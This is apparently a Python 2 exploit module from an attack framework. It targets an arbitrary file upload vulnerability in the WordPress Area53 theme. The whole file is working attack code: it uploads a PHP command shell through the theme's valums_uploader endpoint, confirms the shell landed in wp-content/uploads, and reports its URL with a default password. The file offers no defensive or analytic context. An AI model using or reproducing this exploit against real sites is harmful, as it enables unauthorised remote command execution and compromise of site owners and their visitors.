# -*- coding: utf-8-*-
class NSSPlugin:
    infos = [
        ['NAME','WordPress Area53 theme Arbitrary File Upload'],
        ['AUTHOR','nss'],
        ['WEBSITE','http://jadore.wang'],
        ['UPTIME','2014/07/14']
        ]
    opts  = [
        ['RURL','127.0.0.1','target url'],
        ['RPORT','80','target port'],
        ['RPATH','/','target wp-path'],
        ['UPFILE','evalshell.php','file to upload(dir:temp)'],
        ['PAYLOAD','php_cmdshell','You can change it=false :)']
        ]
    def exploit(self):
        if RPORT == "80":
            url = "http://%s%s"%(RURL,RPATH)
        elif RPORT == "443":
            url = "https://%s%s"%(RURL,RPATH)
        else:
            url = "http://%s:%s%s"%(RURL,RPORT,RPATH)
        tmp = time.strftime('%Y/%m',time.localtime(time.time()))
        vul = url+"wp-content/themes/area53/framework/_scripts/valums_uploader/php.php"
        shl = url+"wp-content/uploads/%s/%s"%(tmp,UPFILE)
        dat = {"qqfile":open("temp/%s"%UPFILE,"rb")}
        pwd = "nss"#default
        try:
            pp.prettyPrint("[*] TRY UPFILE..",YELLOW)
            exploitModule.urlUpload(vul,dat)
            pp.prettyPrint("[+] CHECK IF FILE UPLOADED...",YELLOW)
            check = exploitModule.urlGET(shl).getcode()
            if check == 200:
                pp.prettyPrint("[*] Exploit Successful !",YELLOW)
                pp.prettyPrint("[-] SHELL: %s\n[-] PASS : %s"%(shl,pwd),GREEN)
            else:
                pp.prettyPrint("[!] Exploit False :( [%s]"%check,RED)
        except Exception,e:
            pp.prettyPrint("[!] ERR:%s"%e,RED)
